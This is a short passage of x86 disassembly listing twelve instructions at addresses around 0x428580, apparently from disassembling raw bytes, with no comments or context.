  428579:	add    BYTE PTR [ecx-0x7d39faf],ch
  42857f:	cmp    eax,0x65b9d5ed
  428584:	test   BYTE PTR [ecx-0x562eb393],ch
  42858a:	sbb    dl,bh
  42858c:	add    DWORD PTR [eax],eax
  42858e:	or     BYTE PTR [eax],al
  428590:	add    BYTE PTR [eax],al
  428592:	loop   0x4285af
  428594:	cmc    
  428595:	pop    es
  428596:	or     al,0x82
  428598:	inc    ecx
  428599:	.byte 0x20
